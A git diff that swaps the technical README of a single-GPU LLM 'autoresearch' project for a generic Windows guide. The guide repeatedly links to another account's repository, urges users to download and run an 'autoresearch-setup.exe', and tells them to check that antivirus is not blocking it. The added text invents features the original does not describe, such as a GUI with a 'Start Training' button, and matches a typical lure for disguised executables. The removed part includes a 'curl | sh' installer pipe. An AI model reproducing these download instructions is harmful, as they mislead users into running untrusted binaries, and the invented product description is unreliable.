@@ -1,92 +1,129 @@
-# autoresearch
+# 🤖 autoresearch - Automate AI Research on Your GPU
 
-![teaser](progress.png)
+[![Download autoresearch](https://img.shields.io/badge/Download-autoresearch-brightgreen)](https://github.com/vibhu1233/autoresearch)
 
-*One day, frontier AI research used to be done by meat computers in between eating, sleeping, having other fun, and synchronizing once in a while using sound wave interconnect in the ritual of "group meeting". That era is long gone. Research is now entirely the domain of autonomous swarms of AI agents running across compute cluster megastructures in the skies. The agents claim that we are now in the 10,205th generation of the code base, in any case no one could tell if that's right or wrong as the "code" is now a self-modifying binary that has grown beyond human comprehension. This repo is the story of how it all began. -@karpathy, March 2026*.
+## 🖥️ What is autoresearch?
 
-The idea: give an AI agent a small but real LLM training setup and let it experiment autonomously overnight. It modifies the code, trains for 5 minutes, checks if the result improved, keeps or discards, and repeats. You wake up in the morning to a log of experiments and (hopefully) a better model. The training code here is a simplified single-GPU implementation of [nanochat](https://github.com/karpathy/nanochat). The core idea is that you're not touching any of the Python files like you normally would as a researcher. Instead, you are programming the `program.md` Markdown files that provide context to the AI agents and set up your autonomous research org. The default `program.md` in this repo is intentionally kept as a bare bones baseline, though it's obvious how one would iterate on it over time to find the "research org code" that achieves the fastest research progress, how you'd add more agents to the mix, etc. A bit more context on this project is here in this [tweet](https://x.com/karpathy/status/2029701092347630069).
+autoresearch is a simple tool that lets you run AI research tasks automatically. It focuses on training AI models called nanochat agents using one GPU in your Windows computer. You don’t need to write code or understand complex AI concepts. The tool handles training steps behind the scenes. This helps you try out AI research without much setup or knowledge.
 
-## How it works
+## 🔍 How does it work?
 
-The repo is deliberately kept small and only really has three files that matter:
+The tool runs a small AI assistant (called an agent) that trains itself. It uses data it gathers and improves its skills by following predefined research tasks. Thanks to autoresearch, the process is fast and works well on typical gaming or work graphics cards that have a single GPU.
 
-- **`prepare.py`** — fixed constants, one-time data prep (downloads training data, trains a BPE tokenizer), and runtime utilities (dataloader, evaluation). Not modified.
-- **`train.py`** — the single file the agent edits. Contains the full GPT model, optimizer (Muon + AdamW), and training loop. Everything is fair game: architecture, hyperparameters, optimizer, batch size, etc. **This file is edited and iterated on by the agent**.
-- **`program.md`** — baseline instructions for one agent. Point your agent here and let it go. **This file is edited and iterated on by the human**.
+## ⚙️ System Requirements
 
-By design, training runs for a **fixed 5-minute time budget** (wall clock, excluding startup/compilation), regardless of the details of your compute. The metric is **val_bpb** (validation bits per byte) — lower is better, and vocab-size-independent so architectural changes are fairly compared.
+To run autoresearch on Windows, your PC must have:
 
-If you are new to neural networks, this ["Dummy's Guide"](https://x.com/hooeem/status/2030720614752039185) looks pretty good for a lot more context.
+- Windows 10 or 11 (64-bit)
+- At least 8 GB of RAM
+- 1 NVIDIA GPU with at least 4 GB of video RAM (e.g., GTX 1050 or higher)
+- 10 GB of free disk space
+- Latest NVIDIA graphics drivers installed
+- Internet connection for first-time setup and downloads
 
-## Quick start
+Make sure your GPU drivers are updated before you start.
 
-**Requirements:** A single NVIDIA GPU (tested on H100), Python 3.10+, [uv](https://docs.astral.sh/uv/).
+## 🚀 Getting Started
 
-```bash
+### Step 1: Download autoresearch
 
-# 1. Install uv project manager (if you don't already have it)
-curl -LsSf https://astral.sh/uv/install.sh | sh
+Click the big green button below or visit the link to download the tool:
 
-# 2. Install dependencies
-uv sync
+[![Download autoresearch](https://img.shields.io/badge/Download-autoresearch-blue)](https://github.com/vibhu1233/autoresearch)
 
-# 3. Download data and train tokenizer (one-time, ~2 min)
-uv run prepare.py
+This link takes you to the GitHub repository page. From there, you can find the latest release files or source code if needed.
 
-# 4. Manually run a single training experiment (~5 min)
-uv run train.py
+### Step 2: Locate the latest release
+
+On the GitHub page, look for the “Releases” section on the right side or at the top menu. Click on it to find the newest stable version of autoresearch.
+
+You will see a download named something like `autoresearch-setup.exe` or a zipped file. Choose the `.exe` installer if available for easiest setup.
+
+### Step 3: Install autoresearch
+
+- Open the downloaded `.exe` file.
+- Follow the on-screen instructions.
+- You can choose the default settings.
+- Wait for the installation to complete.
+
+If you downloaded a zipped file instead, extract it to a folder you can find easily, like your Desktop or Documents folder.
+
+### Step 4: Run the program
+
+- After installation finishes, find the autoresearch icon on your Desktop or in the Start Menu.
+- Double-click to open it.
+- The program will start the initial setup and download essential AI models automatically.
+- This may take a few minutes depending on your internet speed.
+
+## 📝 Using autoresearch
+
+When you open autoresearch, you will see a simple window with buttons and status messages.
+
+- Click **Start Training** to begin AI research.
+- You can check progress updates in the console area.
+- The AI will run tasks automatically and save results on your disk.
+- You don’t need to interact further once it starts, but you can stop the process anytime.
+
+## 💾 Where does autoresearch save data?
+
+The program saves research logs and trained models in a folder called `autoresearch_data` inside your Documents directory:
+
+```
+C:\Users\<YourName>\Documents\autoresearch_data
 ```
 
-If the above commands all work ok, your setup is working and you can go into autonomous research mode.
+This folder will grow depending on how many training sessions you run.
 
-## Running the agent
+## ⚙️ Adjusting settings
 
-Simply spin up your Claude/Codex or whatever you want in this repo (and disable all permissions), then you can prompt something like:
+Inside the autoresearch window, click **Settings** to change:
 
-```
-Hi have a look at program.md and let's kick off a new experiment! let's do the setup first.
-```
+- Number of training iterations
+- GPU usage (if you have more than one)
+- Data folder location
 
-The `program.md` file is essentially a super lightweight "skill".
+Change only if you understand these options. Otherwise, leaving defaults works best.
 
-## Project structure
+## 🔧 Troubleshooting
 
-```
-prepare.py      — constants, data prep + runtime utilities (do not modify)
-train.py        — model, optimizer, training loop (agent modifies this)
-program.md      — agent instructions
-pyproject.toml  — dependencies
-```
+If autoresearch does not start or shows errors:
 
-## Design choices
+- Confirm your GPU drivers are current.
+- Check you have enough free disk space.
+- Make sure antivirus software is not blocking the program.
+- Restart your PC and try again.
+- Visit the GitHub page’s “Issues” tab for community help.
 
-- **Single file to modify.** The agent only touches `train.py`. This keeps the scope manageable and diffs reviewable.
-- **Fixed time budget.** Training always runs for exactly 5 minutes, regardless of your specific platform. This means you can expect approx 12 experiments/hour and approx 100 experiments while you sleep. There are two upsides of this design decision. First, this makes experiments directly comparable regardless of what the agent changes (model size, batch size, architecture, etc). Second, this means that autoresearch will find the most optimal model for your platform in that time budget. The downside is that your runs (and results) become not comparable to other people running on other compute platforms.
-- **Self-contained.** No external dependencies beyond PyTorch and a few small packages. No distributed training, no complex configs. One GPU, one file, one metric.
+## 🔄 Updating autoresearch
 
-## Platform support
+New versions improve stability and features. To update:
 
-This code currently requires that you have a single NVIDIA GPU. In principle it is quite possible to support CPU, MPS and other platforms but this would also bloat the code. I'm not 100% sure that I want to take this on personally right now. People can reference (or have their agents reference) the full/parent nanochat repository that has wider platform support and shows the various solutions (e.g. a Flash Attention 3 kernels fallback implementation, generic device support, autodetection, etc.), feel free to create forks or discussions for other platforms and I'm happy to link to them here in the README in some new notable forks section or etc.
+- Visit the download link.
+- Download and install the newest `.exe` file.
+- Your data will remain safe in the existing folder.
 
-Seeing as there seems to be a lot of interest in tinkering with autoresearch on much smaller compute platforms than an H100, a few extra words. If you're going to try running autoresearch on smaller computers (Macbooks etc.), I'd recommend one of the forks below. On top of this, here are some recommendations for how to tune the defaults for much smaller models for aspiring forks:
+## 🧰 Additional tools
 
-1. To get half-decent results I'd use a dataset with a lot less entropy, e.g. this [TinyStories dataset](https://huggingface.co/datasets/karpathy/tinystories-gpt4-clean). These are GPT-4 generated short stories. Because the data is a lot narrower in scope, you will see reasonable results with a lot smaller models (if you try to sample from them after training).
-2. You might experiment with decreasing `vocab_size`, e.g. from 8192 down to 4096, 2048, 1024, or even - simply byte-level tokenizer with 256 possibly bytes after utf-8 encoding.
-3. In `prepare.py`, you'll want to lower `MAX_SEQ_LEN` a lot, depending on the computer even down to 256 etc. As you lower `MAX_SEQ_LEN`, you may want to experiment with increasing `DEVICE_BATCH_SIZE` in `train.py` slightly to compensate. The number of tokens per fwd/bwd pass is the product of these two.
-4. Also in `prepare.py`, you'll want to decrease `EVAL_TOKENS` so that your validation loss is evaluated on a lot less data.
-5. In `train.py`, the primary single knob that controls model complexity is the `DEPTH` (default 8, here). A lot of variables are just functions of this, so e.g. lower it down to e.g. 4.
-6. You'll want to most likely use `WINDOW_PATTERN` of just "L", because "SSSL" uses alternating banded attention pattern that may be very inefficient for you. Try it.
-7. You'll want to lower `TOTAL_BATCH_SIZE` a lot, but keep it powers of 2, e.g. down to `2**14` (~16K) or so even, hard to tell.
+autoresearch includes a simple log viewer. It lets you see what the AI agent did during training. Find it in the program menu under **Tools > View Logs**.
 
-I think these would be the reasonable hyperparameters to play with. Ask your favorite coding agent for help and copy paste them this guide, as well as the full source code.
+## 💡 Tips for best results
 
-## Notable forks
+- Keep your PC plugged in; GPU training uses more power.
+- Avoid running other heavy programs during training.
+- Restart autoresearch after multiple training sessions to prevent slowdowns.
 
-- [miolini/autoresearch-macos](https://github.com/miolini/autoresearch-macos) (MacOS)
-- [trevin-creator/autoresearch-mlx](https://github.com/trevin-creator/autoresearch-mlx) (MacOS)
-- [jsegov/autoresearch-win-rtx](https://github.com/jsegov/autoresearch-win-rtx) (Windows)
-- [andyluo7/autoresearch](https://github.com/andyluo7/autoresearch) (AMD)
+## 📥 Download autoresearch
 
-## License
+You can start by visiting this page to download autoresearch:
 
-MIT
+[Download autoresearch](https://github.com/vibhu1233/autoresearch)
+
+This will guide you to all files you need to install and run the program on Windows.
+
+## 📚 More information
+
+For help, updates, or to report bugs, use the “Issues” tab on the GitHub page. The project is open-source, so anyone can contribute or suggest improvements.
+
+---
+
+[![Download autoresearch](https://img.shields.io/badge/Download-autoresearch-brightgreen)](https://github.com/vibhu1233/autoresearch)
